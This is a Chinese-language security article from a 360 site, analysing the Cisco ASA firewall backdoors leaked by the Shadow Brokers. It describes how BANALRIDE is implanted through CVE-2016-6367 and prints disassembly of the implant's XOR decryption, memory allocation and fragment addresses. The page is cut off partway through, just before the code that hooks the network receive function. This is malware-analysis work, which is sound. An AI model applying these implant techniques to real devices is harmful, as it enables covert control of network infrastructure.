<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>揭开思科ASA防火墙网络军火的面纱（下）Shadow Brokers 泄露后门完整分析 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="ASA后门,思科,后门,CVE-2016-6367,Shadow Broker"/>
    
        <meta name="description" content="今年8月Shadow Brokers 曝出的EPICBANANA、JETPLOW、SCREAMPLOW等工具中包含了思科ASA系列防火墙漏洞利用和后门攻击代码，360 MeshFire团队针对ASA设备后门技术原理和植入方法进行了完整分析，并重点对研究了其内存型和持久化型后门，展示了网络基础设施的后门攻击原理与方法。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>揭开思科ASA防火墙网络军火的面纱（下）Shadow Brokers 泄露后门完整分析</h2>
                <div class="article-msg">
                    <span class="time">2016-12-01 15:29:54</span>
                    
                                        <span class="read">阅读：25401次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3248"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3248" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2758821769" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2758821769" style="color:#848e99;">360 MeshFire Team</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p0.qhimg.com/t010b9dda9e3008393d.jpg" title="t015af912f2dbca45f6.jpg" alt="http://p2.qhimg.com/t015af912f2dbca45f6.jpg"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=2758821769" target="_blank" textvalue="360 MeshFire Team" style="text-decoration: none;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">360 MeshFire Team</span></strong><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></a></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：700RMB（不服你也来投稿啊！）</span></strong><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><span style="text-indent: 32px; font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至</span></strong></span><a href="mailto:linwei@360.cn" target="_self" style="text-indent: 32px; white-space: normal; text-decoration: none;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">linwei#360.cn</span></strong><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></a><span style="text-indent: 32px; font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">，或登陆</span></strong></span><a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-indent: 32px; white-space: normal; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><strong>网页版</strong></a><span style="text-indent: 32px; font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在线投稿</span></strong></span></span></strong><strong><span style="font-size: 18px; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">传送门</span></strong></span></p><hr/><p style="text-indent: 2em;"><a href="http://bobao.360.cn/learning/detail/3053.html" target="_blank" style="text-decoration: none;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">揭开思科ASA防火墙网络军火的面纱（上）</span></strong><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></a></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">今年8月Shadow Brokers 曝出的EPICBANANA、JETPLOW、SCREAMPLOW等工具中包含了思科ASA系列防火墙漏洞利用和后门攻击代码，360 MeshFire团队针对ASA设备后门技术原理和植入方法进行了完整分析，并重点对研究了其内存型和持久化型后门，展示了网络基础设施的后门攻击原理与方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x01 背景</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">今年8月， Shadow Brokers组织在其Twitter微博上公开了入侵NSA后获取的大量黑客工具，并将部分放在网上进行拍卖。根据Shadow Brokers描述，这些工具原属于著名的黑客团队方程式组织（Equation Group），思科的官方博客也在第一时间对该后门进行了简要分析，以下是思科官方博客给出漏洞和后门模块研究分析，360 MeshFire团队也第一时间对泄漏文件、0DAY漏洞和植入后门进行了深入研究和完整分析。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0172a6cd4aafe73819.png" title="t01a66cbbd69b192d0b.png" alt="http://p2.qhimg.com/t01a66cbbd69b192d0b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在该系列上一篇文章中我们主要针对EXTRABACON模块中Cisco ASA防火墙SNMP远程代码执行的0DAY漏洞（CVE-2016-6366），对产生原因和利用原理进行了详细分析。</span><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">详见链接：</span><a href="http://bobao.360.cn/learning/detail/3053.html" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">http://bobao.360.cn/learning/detail/3053.html</a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">该漏洞实现了思科网络基础设施的破门并获取网络设备管理员权限，如何植入后门并实施更加隐蔽的后门攻击等攻击手段则是在EPICBANANA和JETPLOW的模块中实现，后门模块提供了更加复杂和隐蔽的攻击方法，我们将在该篇文章中详细分析ASA设备的后门原理和植入方法，并对后门连接作简单演示。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x02&nbsp; Cisco ASA后门简介</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">泄漏的文件中专门针对于Cisco ASA防火墙的后门可分为内存型和持久化型。从我们的分析看，内存型后门被命名为BANALRIDE和BANANAGLEE（简称BG），其中BANALRIDE只提供基本的控制功能和一些原始设备操作的API，而BG相对于BANALRIDE的功能更加强大和复杂；持久化后门又分为JETPLOW和SCREAMPLOW，其中JETPLOW作为早期的持久化后门主要针对于PIX防火墙和部分ASA设备，而新版本的被称为SCREAMPLOW是JETPLOW的升级版。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在整个后门植入过程中，首先需要利用命令解析漏洞（CVE-2016-6367），漏洞利用的前提是攻击者能够成功登录设备，可用已知用户名和密码登录，也可以利用漏洞修改登录流程实现任意账户名密码直接登录（见第一篇文章）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后执行epicbanana__2.1.0.1.py 脚本通过ssh或telnet登录到ASA系统，并发送payload至console终端，该脚本将构造15个攻击载荷到console终端下触发命令行解析漏洞，通过内存溢出的方式将BANALRIDE后门写入到ASA内存中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后使用目录下的bride-1120连接工具连接到BANALRIDE后门，BANALRIDE后门连接后的截图如下：</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t014feb80e947fb6bb6.png" title="t0199391f613fbfa3e1.png" alt="http://p8.qhimg.com/t0199391f613fbfa3e1.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可执行的操作包括获取系统版本，内存操作申请、释放、读取和查看内存等，此外还可以植入控制接口更全面的BG后门（选项30）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">持久化后门JETPLOW和SCREAMPLOW也需要借助BG进行上传植入。但遗憾的是在这次泄露的文件中并没有包含BG后门的真实载荷，莫非在Shadow Broker拍卖转众筹文件里？即便没有BG载荷，我们通过加载错误的BG文件，还是可以显示后门主要功能，包括读配置信息、接口信息和ARP表信息，更全面的读写内存操作，更重要的是实现了模块化的加载持久后攻击后门。</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t016ac12312dae9337c.png" title="t01bc4b84bdbba9ded9.png" alt="http://p4.qhimg.com/t01bc4b84bdbba9ded9.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x03&nbsp;&nbsp; BANALRIDE后门分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">因缺少BANANAGLEE后门载荷，也就无法成功植入持久化SCREAMPLOW后门，我们将重点对可实现完整连接的BANALRIDE后门载荷的运行原理进行动态分析，对持久化后门SCREAMPLOW只作静态分析。本文的调试环境基于Cisco ASA 5505型号ASA设备，系统镜像版本为asa804-k8.bin。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">1. 后门初始化</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当BANALRIDE初次植入，全部代码被分为14个片段离散分布在ASA网络处理主进程lina进程空间中。通过shellcode控制EIP跳转到第一处片段来执行初始化操作，此段代码块主要执行了两部分操作：</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（1）解密自身代码</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由于BANALRIDE代码经过加密后植入到lina进程中，所以在初始化代码起始处存在解密后续代码的过程：</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">&nbsp;</span></p><pre class="brush:bash;toolbar:false">&nbsp;&nbsp;0xddfeb316:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0xaaaaaa82,%eax
&nbsp;&nbsp;&nbsp;0xddfeb31b:&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;$0xaaaaaaaa,%eax
&nbsp;&nbsp;&nbsp;0xddfeb320:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0xddfeb314,%edi
&nbsp;&nbsp;&nbsp;0xddfeb325:&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;%eax,%edi
&nbsp;&nbsp;&nbsp;0xddfeb327:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0xaaaaaa74,%ecx
&nbsp;&nbsp;&nbsp;0xddfeb32c:&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;$0xaaaaaaaa,%ecx
&nbsp;&nbsp;&nbsp;0xddfeb332:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;(%edi),%bl
&nbsp;&nbsp;&nbsp;0xddfeb334:&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;$0x9c,%bl
&nbsp;&nbsp;&nbsp;0xddfeb337:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%bl,(%edi)
&nbsp;&nbsp;&nbsp;0xddfeb339:&nbsp;&nbsp;inc&nbsp;&nbsp;&nbsp;&nbsp;%edi
&nbsp;&nbsp;&nbsp;0xddfeb33a:&nbsp;&nbsp;loop&nbsp;&nbsp;&nbsp;0xddfeb332
&nbsp;&nbsp;&nbsp;0xddfeb33c:&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;$0x41622d98,%eax
&nbsp;&nbsp;&nbsp;0xddfeb341:&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;%ds</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在地址0xddfeb332~0xddfeb33a的代码通过异或方式循环解密了从0xddfeb33c起始的代码，在第一处解密后的代码中还存在解密其它地址段的代码片段。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（2）申请内存</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将其它分散在lina进程中的后门代码全部copy拼接到新申请的内存中。由于lina进程通过思科自实现的内存池方式来管理内存，而ASA系统中大部分内存的动态申请也是依赖于内存池机制。此后门并没有直接调用glibc中的内存申请函数，而是也复用了lina进程中内存池操作函数sub_89BCE60来申请内存，代码如下：</span></p><pre class="brush:bash;toolbar:false">0xddfeb595:&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;$0x1550
0xddfeb59a:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x89bce60,%eax
0xddfeb59f:&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*%eax
0xddfeb5a1:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;%eax,%edi</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在初始化代码中记录了所有分散的代码片段地址，如下所示：</span></p><pre class="brush:bash;toolbar:false">MEMORY:DDFEB5AE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-3Ch],&nbsp;0DDFEB734h
MEMORY:DDFEB5B9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-38h],&nbsp;0DDFEB944h
MEMORY:DDFEB5C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-34h],&nbsp;0DDFEBB54h
MEMORY:DDFEB5C7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-30h],&nbsp;0DDFEBD64h
MEMORY:DDFEB5CE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-2Ch],&nbsp;0DDFEBF74h
MEMORY:DDFEB5D5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-28h],&nbsp;0DDFEC184h
MEMORY:DDFEB5DC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-24h],&nbsp;0DDFEC394h
MEMORY:DDFEB5E3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-20h],&nbsp;0DDFEC5A4h
MEMORY:DDFEB5EA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-1Ch],&nbsp;0DDFEC7B4h
MEMORY:DDFEB5F1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-18h],&nbsp;0DDFEC9C4h
MEMORY:DDFEB5F8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-14h],&nbsp;0DDFECBD4h</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">2. 网络通讯</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ASA对所有网络报文的处理都是通过lina程序来驱动实现的，由于ASA底层Linux系统并不能识别ASA的硬件接口设备，因此无法在Linux系统层面完成网络数据层面的通信，也无法借助系统socket进行通信，只能复用lina进程空间中的网络通信函数。<br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（1）网络接收函数劫持</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当后门程序完成初始化操作后会跳转到ASA系统正常程序流程，但后续为了能够接收攻击者连接指令，则还需开启网络接收功能，后门连接并未指定专用网络端口，因此必须监听所有端口上的数据流量，并从中筛选出连接指令。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在ASA系统主进程lina中，网络模块在处理数据报文时使用回调函数</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">sub_8660C30来处理从物理网口接收到的每一个数据包。BANALRIDE可以通过劫持此函数，使正常的报文处理流程跳转到自身代码中，并从栈中取出报文地址，以达到劫持经过ASA网口所有流量的目的。实现HOOK网络接收程序代码如下：</span></p><pre 